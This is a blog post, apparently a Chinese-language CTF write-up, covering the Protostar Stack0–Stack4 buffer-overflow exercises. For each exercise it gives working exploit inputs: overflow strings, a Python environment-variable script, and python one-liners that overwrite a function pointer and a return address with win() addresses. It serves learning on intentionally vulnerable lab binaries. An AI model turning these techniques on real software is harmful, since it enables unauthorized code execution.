---
layout: post
title: Protostar WriteUp
catagories: [ctf-execrise]
tags: [ctf, writeup, protostar]
---

> 堆、栈、格式化字符串漏洞利用学习


##Stack0

`gets()`函数不检查输入长度是否已溢出，所以输入超过buffer的长度，自然会覆盖到栈上的其它变量，
而`Modified`变量是紧跟着`buffer[]`的，因此被改写。

```
$ ./stack0
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
you have changed the 'modified' variable
$ 
```

##Stack1

这一题要求modified的变量值为`0x61626364`. 因为数据是小端表示的，因此传给modifed的字符串应该是`"dcba"`.

```
$ ./stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdcba
you have correctly got the variable to the right value
$ 
```

##Stack2

因为`os.environ`改过的环境变量只在这个进程内部有效，进程外部无效，但其子进程是继承的父进程的环境变量，所以可以用`subprocess.Popen`来运行stack2

```python
import os
import subprocess
os.environ["GREENIE"]="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + "\x0a\x0d\x0a\x0d"
#print os.environ["GREENIE"]

cmd = "/opt/protostar/bin/stack2"
subprocess.Popen(cmd, close_fds=True, stderr=subprocess.PIPE, shell=True)
```

```
$ python ss.py
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA


$ you have correctly modified the variable
```

##Stack3

`objdump -d stack3`，拿到win()的地址`0x08048424`

构造输入：

```
$ python -c "print 'A'*64 + '\x24\x84\x04\x08'"|./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
$ 
```

##Stack4

拿到win()的地址`080483f4`

因为有对齐，原来的栈顶`0xbffffc48`变成了`0xbffffc40`

eip在ebp的下方

因此，应填充的padd为64+8+4,下接win的地址

```python
python -c "print 'A'*64 + 'B'*8 +'C'*4 + '\xf4\x83\x04\x08'"
```

```
$  python -c "print 'A'*64 + 'B'*8 +'C'*4 + '\xf4\x83\x04\x08'"|./stack4
code flow successfully changed
Segmentation fault
```

##Stack5
